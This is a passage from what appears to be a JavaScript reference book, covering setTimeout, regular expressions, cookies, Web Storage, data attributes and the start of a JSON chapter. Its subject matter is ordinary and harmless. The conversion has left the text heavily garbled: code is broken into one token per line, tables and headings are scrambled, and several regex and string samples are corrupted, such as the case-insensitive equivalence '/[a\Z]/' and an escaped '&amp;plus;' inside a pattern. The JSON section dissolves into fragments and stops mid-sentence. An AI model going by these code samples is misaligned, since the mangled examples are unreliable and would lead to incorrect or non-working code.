Additionally though, due to the fact that JavaScript is single
threaded and uses a global event loop, setTimeout can be used to add
an item to the end of the execution queue by calling setTimeout with
zero delay. For example:

setTimeout

(

**function**

(

)

{

console.

log

(

&apos;world&apos;

)

;

}

,

0

)

;

console.

log

(

&apos;hello&apos;

)

;

Will actually output:

hello

world

  
  setTimeout
  

  

Also, zero milliseconds here does not mean the function inside the
setTimeout will execute immediately. It will take slightly more than
that depending upon the items to be executed remaining in the
execution queue. This one is just pushed to the end of the queue.
**Cancelling a timeout clearTimeout() :** stops the execution of the
function specified in () **Syntax :** clearTimeout(timeoutVariable) or
window.clearTimeout(timeoutVariable)
>
**Example :**

**var**

timeout

=

setTimeout

(

**function**

(

)

{

console.

log

(

&apos;hello&apos;

)

;

}

,

1000

)

;

clearTimeout

(

timeout

)

;

*// The timeout will no longer be executed*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch31">Chapter 31: Regular expressions</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

**Flags Details** g **g**lobal. All matches (don&apos;t return on the
first match). m **m**ulti-line. Causes **&Hat;** & **&dollar;** to match the
begin/end of each line (not only begin/end of string). i
**i**nsensitive. Case insensitive match (ignores case of &lbrack;a-zA-Z&rbrack;).

u **u**nicode : Pattern strings are treated as **UTF-16**. Also causes
escape sequences to match Unicode characters. stick**y**: matches only
from the index indicated by the lastIndex property of this regular
expression in the

y target string (and does not attempt to match from any later
indexes).

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch31-1">Section 31.1: Creating a RegExp Object</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

**Standard Creation**

It is recommended to use this form only when creating regex from
dynamic variables.

Use when the expression may change or the expression is user
generated.

**var**

re

=

**new**

RegExp

(

&quot;.&ast;&quot;

)

;

With flags:

**var**

re

=

**new**

RegExp

(

&quot;.&ast;&quot;

,

&quot;gmi&quot;

)

;

With a backslash: (this must be escaped because the regex is specified
with a string)

**var**

re

=

**new**

RegExp

(

&quot;

**&bsol;&bsol;&amp;ast;*

w&ast;&quot;

)

;

**Static initialization**
>
Use when you know the regular expression will not change, and you know
what the expression is before runtime.

**var**

re

=

*/.&ast;/*

;

With flags:

**var**

re

=

*/.&ast;/gmi*

;

With a backslash: (this should not be escaped because the regex is
specified in a literal)

**var**

re

=

*/&bsol;&bsol;w&ast;/*

;

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch31-2">Section 31.2: RegExp Flags</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

  -
  test                                     /          gi
  - - 

  -

  
  **new** RegExp                 (   &apos;test&apos;           ,   &apos;gi&apos;
  -  -  

  

There are several flags you can specify to alter the RegEx behaviour.
Flags may be appended to the end of a regex literal, such as
specifying gi in /, or they may be specified as the second argument to
the RegExp constructor, as in ).

  
  zA
  

  

g - Global. Finds all matches instead of stopping after the first. i -
Ignore case. /&lbrack;a-z&rbrack;/i is equivalent to /&lbrack;a&bsol;Z&rbrack;/.
>
m - Multiline. &Hat; and &dollar; match the beginning and end of each line
respectively treating &bsol;&bsol;n and &bsol;&bsol;r as delimiters instead of simply the
beginning and end of the entire string.

Version ≥ 6

u - Unicode. If this flag is not supported you must match specific
Unicode characters with &bsol;&bsol;uXXXX where XXXX is the character&apos;s value
in hexadecimal. y - Finds all consecutive/adjacent matches.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch31-3">Section 31.3: Check if string contains pattern using .test()</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

**var**

re

=

*/&lbrack;a-z&rbrack;+/*

;

**if**

(

re.

test

(

&quot;foo&quot;

)

)

{

console.

log

(

&quot;Match exists.&quot;

)

;

}

The test method performs a search to see if a regular expression
matches a string. The regular expression &lbrack;a-z&rbrack;+ will search for one
or more lowercase letters. Since the pattern matches the string,
"match exists" will be logged to the console.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch31-4">Section 31.4: Matching With .exec()</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

  **exec**


**Match Using .()**

  RegExp.**prototype**                     .   exec       (   string


) returns an array of captures, or **null** if there was no match.

**var**

re

=

*/(&lbrack;0-9&rbrack;+)&lbrack;a-z&rbrack;+/*

;

**var**

match

=

re.

exec

(

&quot;foo123bar&quot;

)

;

  
  match.index
  

  

is 3, the (zero-based) location of the match.

  
  match
  

  

&lbrack;0&rbrack; is the full match string.

  
  match   &lbrack;1&rbrack; is the text corresponding to the first captured       match
          group.                                                      
  - - -

  

&lbrack;n&rbrack; would be the value of the *n*th captured group.

**Loop Through Matches Using**

**.**

**exec**

**(**

**)**

**var**

re

=

*/a/g*

;

**var**

result

;

while

(

(

result

=

re.

exec

(

&apos;barbatbaz&apos;

)

)

!==

**null**

)

{

console.

log

(

&quot;found &apos;&quot;

&plus;

result

&lbrack;

0

&rbrack;

&plus;

&quot;&apos;, next exec starts at index &apos;&quot;

&plus;

re.

lastIndex

&plus;

&quot;&apos;&quot;

)

;

}

Expected output

found &apos;a&apos;, next exec starts at index &apos;2&apos; found &apos;a&apos;, next exec
starts at index &apos;5&apos; found &apos;a&apos;, next exec starts at index &apos;8&apos;

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch31-5">Section 31.5: Using RegExp With Strings</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

The String object has the following methods that accept regular
expressions as arguments.

&quot;string&quot;

.

match

(

&hellip;

&quot;string&quot;

.

replace

(

&hellip;

&quot;string&quot;

.

split

(

&hellip;

&quot;string&quot;

.

search

(

&hellip;

**Match with RegExp**

console.

log

(

&quot;string&quot;

.

match

(

*/&lbrack;i-n&rbrack;+/*

)

)

;

console.

log

(

&quot;string&quot;

.

match

(

*/(r)&lbrack;i-n&rbrack;+/*

)

)

;

Expected output

Array &lbrack;&quot;in&quot;&rbrack;

Array &lbrack;&quot;rin&quot;, &quot;r&quot;&rbrack;

**Replace with RegExp**

console.

log

(

&quot;string&quot;

.

replace

(

*/&lbrack;i-n&rbrack;+/*

,

&quot;foo&quot;

)

)

;

Expected output

strfoog

**Split with RegExp**

console.

log

(

&quot;stringstring&quot;

.

split

(

*/&lbrack;i-n&rbrack;+/*

)

)

;

Expected output

Array &lbrack;&quot;str&quot;, &quot;gstr&quot;, &quot;g&quot;&rbrack;

**Search with RegExp**

  
  search
  

  

.() returns the index at which a match is found or -1.

console.

log

(

&quot;string&quot;

.

search

(

*/&lbrack;i-n&rbrack;+/*

)

)

;

console.

log

(

&quot;string&quot;

.

search

(

*/&lbrack;o-q&rbrack;+/*

)

)

;

Expected output
>
3
>
-1

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch31-6">Section 31.6: RegExp Groups</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

JavaScript supports several types of group in its Regular Expressions,
*capture groups*, *non-capture groups* and *lookaheads*. Currently,
there is no *look-behind* support.
>
**Capture**

  
  pattern
  

  

Sometimes the desired match relies on its context. This means a simple
*RegExp* will over-find the piece of the *String* that is of interest,
so the solution is to write a capture group (). The captured data can
then be referenced as&hellip;

  
  str.match
  

  

  
  str.match         discards captures, use                  re.exec
    -

  

String replacement &quot;&dollar;n&quot; where n is the *n th* capture group
(starting from 1) The *n th* argument in a callback function
>
If the *RegExp* is not flagged g, the *n+1 th* item in a returned
*Array*
>
If the *RegExp* is flagged g, instead
>
Say there is a *String* where all + signs need to be replaced with a
space, but only if they follow a letter character. This means a simple
match would include that letter character and it would also be
removed. Capturing it is the solution as it means the matched letter
can be preserved.

**let**

str

=

&quot;aa+b+cc+1+2&quot;

,

re

=

*/(&lbrack;a-z&rbrack;)&amp;plus;/g*

;

*// String replacement*

str.

replace

(

re

,

&apos;&dollar;1 &apos;

)

;

*// &quot;aa b cc 1+2&quot;*

*// Function replacement*

str.

replace

(

re

,

(

m

,

&dollar;1

)

=&gt;

&dollar;1

&plus;

&apos; &apos;

)

;

*// &quot;aa b cc 1+2&quot;*

**Non-Capture**

  
  ?:pattern
  

  

Using the form (), these work in a similar way to capture groups,
except they do not store the contents of the group after the match.
>
They can be particularly useful if other data is being captured which
you don&apos;t want to move the indices of, but need to do some advanced
pattern matching such as an OR

**let**

str

=

&quot;aa+b+cc+1+2&quot;

,

re

=

*/(?:&bsol;&bsol;b&vert;c)(&lbrack;a-z&rbrack;)&amp;plus;/g*

;

str.

replace

(

re

,

&apos;&dollar;1 &apos;

)

;

*// &quot;aa+b c 1+2&quot;*

**Look-Ahead**

  
  ?=pattern
  

  

If the desired match relies on something which follows it, rather than
matching that and capturing it, it is possible to use a look-ahead to
test for it but not include it in the match. A positive look-ahead has
the form (), a negative look-ahead (where the expression match only
happens if the look-ahead pattern did not match) has the

  
  ?!pattern
  

  

form ()

**let**

str

=

&quot;aa+b+cc+1+2&quot;

,

re

=

*/&amp;plus;(?=&lbrack;a-z&rbrack;)/g*

;

str.

replace

(

re

,

&apos; &apos;

)

;

*// &quot;aa b cc+1+2&quot;*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch31-7">Section 31.7: Replacing string match with a callback function</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

  String#replace


can have a function as its second argument so you can provide a
replacement based on some
>
logic.

&quot;Some string Some&quot;

.

replace

(

*/Some/g*

,

(

match

,

startIndex

,

wholeString

)

=&gt;

{

**if**

(

startIndex

==

0

)

{

**return**

&apos;Start&apos;

;

}

**else**

{

**return**

&apos;End&apos;

;

}

}

)

;

*// will return Start string End*

One line template library

**let**

data

=

{

name

:

&apos;John&apos;

,

surname

:

&apos;Doe&apos;

}

&quot;My name is {surname}, {name} {surname}&quot;

.

replace

(

*/(?:{(.+?)})/g*

,

x

=&gt;

data

&lbrack;

x&period;

slice

(

1

,-

1

)

&rbrack;

)

;

*// &quot;My name is Doe, John Doe&quot;*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch31-8">Section 31.8: Using Regex.exec() with parentheses regex to extract matches of a string</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Sometimes you doesn&apos;t want to simply replace or remove the string.
Sometimes you want to extract and process matches. Here an example of
how you manipulate matches.
>
What is a match ? When a compatible substring is found for the entire
regex in the string, the exec command produce a match. A match is an
array compose by firstly the whole substring that matched and all the
parenthesis in the match.
>
Imagine a html string :

**&lt;**

**html**

**&gt;**

**&lt;**

**head**

**&gt;**

**&lt;**

**/head**

**&gt;**

**&lt;**

**body**

**&gt;**

**&lt;**

**h**

**1**

**&gt;**

Example

**&lt;**

**/h**

**1**

**&gt;**

**&lt;**

**p**

**&gt;**

Look at this great link :

**&lt;**

**a**

href

=

&quot;http://goalkicker.com&quot;

**&gt;**

goalkicker

**&lt;**

**/a**

**&gt;**

http://anotherlinkoutsideatag

**&lt;**

**/p**

**&gt;**

Copyright

**&lt;**

**a**

href

=

&quot;https://stackoverflow.com&quot;

**&gt;**

Stackoverflow

**&lt;**

**/a**

**&gt;**

**&lt;**

**/body**

**&gt;**

You want to extract and get all the links inside an a tag. At first,
here the regex you write :

**var**

re

=

*/&lt;a&lbrack;&Hat;&gt;&rbrack;&ast;href=&quot;https?:&bsol;&bsol;/&bsol;&bsol;/.&ast;&quot;&lbrack;&Hat;&gt;&rbrack;&ast;&gt;&lbrack;&Hat;&lt;&rbrack;&ast;&lt;&bsol;&bsol;/a&gt;/g*

;

But now, imagine you want the href and the anchor of each link. And
you want it together. You can simply add a new regex in for each match
**OR** you can use parentheses :

**var**

re

=

*/&lt;a&lbrack;&Hat;&gt;&rbrack;&ast;href=&quot;(https?:&bsol;&bsol;/&bsol;&bsol;/.&ast;)&quot;&lbrack;&Hat;&gt;&rbrack;&ast;&gt;(&lbrack;&Hat;&lt;&rbrack;&ast;)&lt;&bsol;&bsol;/a&gt;/g*

;

**var**

str

=

&apos;&lt;html&gt;

**&bsol;&bsol;n**

&lt;head&gt;&lt;/head&gt;

**&bsol;&bsol;n**

&lt;body&gt;

**&bsol;&bsol;n**

&lt;h1&gt;Example&lt;/h1&gt;

**&bsol;&bsol;n**

&lt;p&gt;Look at this

great link: &lt;a href=&quot;http://goalkicker.com&quot;&gt;goalkicker&lt;/a&gt;
http://anotherlinkoutsideatag&lt;/p&gt;

**&bsol;&bsol;n**

**&bsol;&bsol;n**

Copyright &lt;a href=&quot;https://stackoverflow.com&quot;&gt;Stackoverflow&lt;/a&gt;

**&bsol;&bsol;n**

&lt;/body&gt;

**&bsol;&amp;apos;**

;

**&bsol;&bsol;n**

&apos;

;

**var**

m

;

**var**

links

=

&lbrack;

&rbrack;

;

while

(

(

m

=

re.

exec

(

str

)

)

!==

**null**

)

{

**if**

(

m&period;

index

===

re.

lastIndex

)

{

re.

lastIndex

++

;

}

console.

log

(

m

&lbrack;

0

&rbrack;

)

;

*// The all substring*

console.

log

(

m

&lbrack;

1

&rbrack;

)

;

*// The href subpart*

console.

log

(

m

&lbrack;

2

&rbrack;

)

;

*// The anchor subpart*

links.

push

(

{

match

:

m

&lbrack;

0

&rbrack;

,

*// the entire match*

href

:

m

&lbrack;

1

&rbrack;

,

*// the first parenthesis =&lpar;https?:&bsol;&bsol;/&bsol;&bsol;/.&ast;)*

anchor

:

m

&lbrack;

2

&rbrack;

,

*// the second one =&lpar;&lbrack;&Hat;&lt;&rbrack;&ast;)*

}

)

;

}

At the end of the loop, you have an array of link with anchor and href
and you can use it to write markdown for example :

links.

forEach

(

**function**

(

link

)

{

console.

log

(

&apos;&lbrack;%s&rbrack;(%s)&apos;

,

link.

anchor

,

link.

href

)

;

}

)

;

To go further :
>
Nested parenthesis

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch32"># Chapter 32: Cookies</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch32-1">Section 32.1: Test if cookies are enabled</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

  
  navigator.cookieEnabled
  

  

If you want to make sure cookies are enabled before using them, you
can use :

**if**

(

navigator.

cookieEnabled

===

**false**

)

{

alert

(

&quot;Error: cookies not enabled!&quot;

)

;

}

  
  navigator.cookieEnabled
  

  

Note that on older browsers may not exist and be undefined. In those
cases you won&apos;t detect that cookies are not enabled.

<h3 id="ch32-2">Section 32.2: Adding and Setting Cookies</h3>

The following variables set up the below example:
>
**var** COOKIE_NAME = &quot;Example Cookie&quot;; */&ast; The cookie&apos;s name.
&ast;/* **var** COOKIE_VALUE = &quot;Hello, world!&quot;; */&ast; The cookie&apos;s
value. &ast;/* **var** COOKIE_PATH = &quot;/foo/bar&quot;; */&ast; The cookie&apos;s
path. &ast;/* **var** COOKIE_EXPIRES; */&ast; The cookie&apos;s expiration date
(config&apos;d below). &ast;/*
>
*/&ast; Set the cookie expiration to 1 minute in future (60000ms = 1
minute). &ast;/* COOKIE_EXPIRES = (**new** Date(Date.now() +
60000)).toUTCString();
>
document.cookie += COOKIE_NAME + &quot;=&quot; + COOKIE_VALUE
>
&plus; &quot;; expires=&quot; + COOKIE_EXPIRES
>
&plus; &quot;; path=&quot; + COOKIE_PATH;

<h3 id="ch32-3">Section 32.3: Reading cookies</h3>

**var**

name

=

name

&plus;

&quot;=&quot;

,

cookie_array

=

document.

cookie

.

split

(

&apos;;&apos;

)

,

cookie_value

;

**for**

(

**var**

i

=

0

;

i

&lt;

cookie_array.

length

;

i

++

)

{

**var**

cookie

=

cookie_array

&lbrack;

i

&rbrack;

;

while

(

cookie.

charAt

(

0

)

==

&apos; &apos;

)

cookie

=

cookie.

substring

(

1

,

cookie.

length

)

;

**if**

(

cookie.

indexOf

(

name

)

==

0

)

cookie_value

=

cookie.

substring

(

name.

length

,

cookie.

length

)

;

}

This will set cookie_value to the value of the cookie, if it exists.
If the cookie is not set, it will set cookie_value to

**null**

<h3 id="ch32-4">Section 32.4: Removing cookies</h3>

**var**

expiry

=

**new**

Date

(

)

;

expiry.

setTime

(

expiry.

getTime

(

)

&minus;

3600

)

;

document.

cookie

=

name

&plus;

&quot;=; expires=&quot;

&plus;

expiry.

toGMTString

(

)

&plus;

&quot;; path=/&quot;

This will remove the cookie with a given name.

<h2 id="ch33">Chapter 33: Web Storage</h2>

**Parameter Description** *name* The key/name of the item *value* The
value of the item

<h3 id="ch33-1">Section 33.1: Using localStorage</h3>

The localStorage object provides persistent (but not permanent - see
limits below) key-value storage of strings. Any changes are
immediately visible in all other windows/frames from the same origin.
The stored values persistent indefinitely unless the user clears saved
data or configures an expiration limit. localStorage uses a map-like
interface for getting and setting values.

localStorage.

setItem

(

&apos;name&apos;

,

&quot;John Smith&quot;

)

;

console.

log

(

localStorage.

getItem

(

&apos;name&apos;

)

)

;

*// &quot;John Smith&quot;*

localStorage.

removeItem

(

&apos;name&apos;

)

;

console.

log

(

localStorage.

getItem

(

&apos;name&apos;

)

)

;

*// null*

If you want to store simple structured data, you can use JSON to
serialize it to and from strings for storage.
>
**var** players = &lbrack;{name: &quot;Tyler&quot;, score: 22}, {name: &quot;Ryan&quot;,
score: 41}&rbrack;; localStorage.setItem(&apos;players&apos;,
JSON.stringify(players));
>
console.log(JSON.parse(localStorage.getItem(&apos;players&apos;)));

*// &lbrack; Object { name: &quot;Tyler&quot;, score: 22 }, Object { name: &quot;Ryan&quot;,
score: 41 } &rbrack;* **localStorage limits in browsers**

Mobile browsers:

**Browser Google Chrome Android Browser Firefox iOS Safari**

++-++-++
| Version           | 40             | 4.3     | 34     | |
|                     |                  |           |          |   |
|                     |                  |           |          | 6 |
|                     |                  |           |          | - |
|                     |                  |           |          | 8 |
+=====================+==================+===========+==========+===+
| Space available     | 10MB             | 2MB       | 10MB   | 5 |
|                     |                  |           |          | M |
|                     |                  |           |          | B |
++-++-++

Desktop browsers:

**Browser Google Chrome Opera Firefox Safari Internet Explorer**

Version 40 27 34 6-8 9-11

Space available 10MB 10MB 10MB 5MB 10MB

<h3 id="ch33-2">Section 33.2: Simpler way of handling Storage</h3>

localStorage, sessionStorage are JavaScript **Objects** and you can
treat them as such.

  
  getItem                     (), .           setItem
    

  

Instead of using Storage Methods like .(), etc... here&apos;s a simpler
alternative:

*// Set*

localStorage.

greet

=

&quot;Hi!&quot;

;

*// Same as: window.localStorage.setItem(&quot;greet&quot;, &quot;Hi!&quot;);*

*// Get*

localStorage.

greet

;

*// Same as: window.localStorage.getItem(&quot;greet&quot;);*

*// Remove item*

**delete**

localStorage.

greet

;

*// Same as: window.localStorage.removeItem(&quot;greet&quot;);*

*// Clear storage*

localStorage.

clear

(

)

;

**Example:**

*// Store values (Strings, Numbers)*

localStorage.

hello

=

&quot;Hello&quot;

;

localStorage.

year

=

2017

;

*// Store complex data (Objects, Arrays)*

**var**

user

=

{

name

:

&quot;John&quot;

,

surname

:

&quot;Doe&quot;

,

books

:

&lbrack;

&quot;A&quot;

,

&quot;B&quot;

&rbrack;

}

;

localStorage.

user

=

JSON.

stringify

(

user

)

;

*// Important: Numbers are stored as String*

console.

log

(

**typeof**

localStorage.

year

)

;

*// String*

*// Retrieve values*

**var**

someYear

=

localStorage.

year

;

*// &quot;2017&quot;*

*// Retrieve complex data*

**var**

userData

=

JSON.

parse

(

localStorage.

user

)

;

**var**

userName

=

userData.

name

;

*// &quot;John&quot;*

*// Remove specific data*

**delete**

localStorage.

year

;

*// Clear (delete) all stored data*

localStorage.

clear

(

)

;

<h3 id="ch33-3">Section 33.3: Storage events</h3>

Whenever a value in set in localStorage, a storage event will be
dispatched on all other windows from the same origin. This can be used
to synchronize state between different pages without reloading or
communicating with a server. For example, we can reflect the value of
an input element as paragraph text in another window: First Window

**var**

input

=

document.

createElement

(

&apos;input&apos;

)

;

document.

body

.

appendChild

(

input

)

;

input.

value

=

localStorage.

getItem

(

&apos;user-value&apos;

)

;

input.

oninput

=

**function**

(

event

)

{

localStorage.

setItem

(

&apos;user-value&apos;

,

input.

value

)

;

}

;

Second Window

**var**

output

=

document.

createElement

(

&apos;p&apos;

)

;

document.

body

.

appendChild

(

output

)

;

output.

textContent

=

localStorage.

getItem

(

&apos;user-value&apos;

)

;

window.

addEventListener

(

&apos;storage&apos;

,

**function**

(

event

)

{

**if**

(

event.

key

===

&apos;user-value&apos;

)

{

output.

textContent

=

event.

newValue

;

}

}

)

;

**Notes**
>
Event is not fired or catchable under Chrome, Edge and Safari if
domain was modified through script.
>
First window

*// page url: http://sub.a.com/1.html*

document.

domain

=

&apos;a.com&apos;

;

**var**

input

=

document.

createElement

(

&apos;input&apos;

)

;

document.

body

.

appendChild

(

input

)

;

input.

value

=

localStorage.

getItem

(

&apos;user-value&apos;

)

;

input.

oninput

=

**function**

(

event

)

{

localStorage.

setItem

(

&apos;user-value&apos;

,

input.

value

)

;

}

;

Second Window

*// page url: http://sub.a.com/2.html*

document.

domain

=

&apos;a.com&apos;

;

**var**

output

=

document.

createElement

(

&apos;p&apos;

)

;

document.

body

.

appendChild

(

output

)

;

*// Listener will never called under Chrome(53), Edge and Safari(10.0).*

window.

addEventListener

(

&apos;storage&apos;

,

**function**

(

event

)

{

**if**

(

event.

key

===

&apos;user-value&apos;

)

{

output.

textContent

=

event.

newValue

;

}

}

)

;

<h3 id="ch33-4">Section 33.4: sessionStorage</h3>

The sessionStorage object implements the same Storage interface as
localStorage. However, instead of being shared with all pages from the
same origin, sessionStorage data is stored separately for every
window/tab. Stored data persists between pages *in that window/tab*
for as long as it&apos;s open, but is visible nowhere else.

**var**

audio

=

document.

querySelector

(

&apos;audio&apos;

)

;

*// Maintain the volume if the user clicks a link then navigates back
here.*

audio.

volume

=

Number

(

sessionStorage.

getItem

(

&apos;volume&apos;

)

&vert;&vert;

1.0

)

;

audio.

onvolumechange

=

**function**

(

event

)

{

sessionStorage.

setItem

(

&apos;volume&apos;

,

audio.

volume

)

;

}

;

Save data to sessionStorage

sessionStorage.

setItem

(

&apos;key&apos;

,

&apos;value&apos;

)

;

Get saved data from sessionStorage

**var**

data

=

sessionStorage.

getItem

(

&apos;key&apos;

)

;

Remove saved data from sessionStorage

sessionStorage.

removeItem

(

&apos;key&apos;

)

<h3 id="ch33-5">Section 33.5: localStorage length</h3>

  
  localStorage.length
  

  

property returns an integer number indicating the number of elements in
the localStorage

Example:
>
Set Items

localStorage.

setItem

(

&apos;StackOverflow&apos;

,

&apos;Documentation&apos;

)

;

localStorage.

setItem

(

&apos;font&apos;

,

&apos;Helvetica&apos;

)

;

localStorage.

setItem

(

&apos;image&apos;

,

&apos;sprite.svg&apos;

)

;

Get length

localStorage.

length

;

*// 3*

<h3 id="ch33-6">Section 33.6: Error conditions</h3>

Most browsers, when configured to block cookies, will also block
localStorage. Attempts to use it will result in an exception. Do not
forget to manage these cases.

**var**

video

=

document.

querySelector

(

&apos;video&apos;

)

**try**

{

video.

volume

=

localStorage.

getItem

(

&apos;volume&apos;

)

}

**catch**

(

error

)

{

alert

(

&apos;If you

**&bsol;&amp;apos;**

d like your volume saved, turn on cookies&apos;

)

}

video.

play

(

)

If error were not handled, program would stop functioning properly.

<h3 id="ch33-7">Section 33.7: Clearing storage</h3>

To clear the storage, simply run

localStorage.

clear

(

)

;

<h3 id="ch33-8">Section 33.8: Remove Storage Item</h3>

To remove a specific item from the browser Storage (the opposite of
setItem) use removeItem

localStorage.

removeItem

(

&quot;greet&quot;

)

;

**Example:**

localStorage.

setItem

(

&quot;greet&quot;

,

&quot;hi&quot;

)

;

localStorage.

removeItem

(

&quot;greet&quot;

)

;

console.

log

(

localStorage.

getItem

(

&quot;greet&quot;

)

)

;

*// null*

(Same applies for sessionStorage)

<h2 id="ch34">Chapter 34: Data attributes</h2>

<h3 id="ch34-1">Section 34.1: Accessing data attributes</h3>

**Using the dataset property**

  
  data-&ast;
  

  

The new dataset property allows access (for both reading and writing)
to all data attributes on any element.

**&lt;**

**p**

**&gt;**

Countries:

**&lt;**

**/p**

**&gt;**

**&lt;**

**ul**

**&gt;**

**&lt;**

**li**

id

=

&quot;C1&quot;

onclick

=

&quot;showDetails(this)&quot;

data-id

=

&quot;US&quot;

data-dial-code

=

&quot;1&quot;

**&gt;**

USA

**&lt;**

**/li**

**&gt;**

**&lt;**

**li**

id

=

&quot;C2&quot;

onclick

=

&quot;showDetails(this)&quot;

data-id

=

&quot;CA&quot;

data-dial-code

=

&quot;1&quot;

**&gt;**

Canada

**&lt;**

**/li**

**&gt;**

**&lt;**

**li**

id

=

&quot;C3&quot;

onclick

=

&quot;showDetails(this)&quot;

data-id

=

&quot;FF&quot;

data-dial-code

=

&quot;3&quot;

**&gt;**

France

**&lt;**

**/li**

**&gt;**

**&lt;**

**/ul**

**&gt;**

**&lt;**

**button**

type

=

&quot;button&quot;

onclick

=

&quot;correctDetails()&quot;

**&gt;**

Correct Country Details

**&lt;**

**/button**

**&gt;**

**&lt;**

**script**

**&gt;**

function showDetails(item) {

var msg = item.innerHTML

&plus; &quot;&bsol;&bsol;r&bsol;&bsol;nISO ID: &quot; + item.dataset.id

&plus; &quot;&bsol;&bsol;r&bsol;&bsol;nDial Code: &quot; + item.dataset.dialCode;

alert(msg);

}

function correctDetails(item) {

var item = document.getEmementById(&quot;C3&quot;);

item.dataset.id = &quot;FR&quot;;

item.dataset.dialCode = &quot;33&quot;;

}

**&lt;**

**/script**

**&gt;**

Note: The dataset property is only supported in modern browsers and
it&apos;s slightly slower than the getAttribute and setAttribute methods
which are supported by all browsers.
>
**Using the getAttribute & setAttribute methods**
>
If you want to support the older browsers before HTML5, you can use
the getAttribute and setAttribute methods which are used to access any
attribute including the data attributes. The two functions in the
example above can be written this way:

**&lt;**

**script**

**&gt;**

function showDetails(item) {

var msg = item.innerHTML

&plus; &quot;&bsol;&bsol;r&bsol;&bsol;nISO ID: &quot; + item.getAttribute(&quot;data-id&quot;)

&plus; &quot;&bsol;&bsol;r&bsol;&bsol;nDial Code: &quot; + item.getAttribute(&quot;data-dial-code&quot;);

alert(msg);

}

function correctDetails(item) {

var item = document.getEmementById(&quot;C3&quot;);

item.setAttribute(&quot;id&quot;, &quot;FR&quot;);

item.setAttribute(&quot;data-dial-code&quot;, &quot;33&quot;);

}

**&lt;**

**/script**

**&gt;**

  
  input                         (     string
   - 

  

++-+-+
| **Parameter**           |                                    | **  |
|                           |                                    | Det |
|                           |                                    | ail |
|                           |                                    | s** |
+===========================+====================================+=====+
| **JSON.parse**            | **Parse a JSON string**            |     |
++-+-+

# Chapter 35: JSON

  -
  reviver                         (    **function**
    

  -

) JSON string to be parsed.

  
  value                         (     string
   - 

  

  -
  **JSON.stringify**   **Serialize a serializable value**
   -

  -

) Prescribes a transformation for the input JSON string.

  
  replacer(**function**                 
   
  Number&lbrack;&rbrack;)                           

  

  
  String
  

  

) Value to be serialized according to the JSON specification.

  
  space                         (     String
   - 

  

or &lbrack;&rbrack; or
>
Selectively includes certain properties of the value object.

If a number is provided, then space number of whitespaces will be

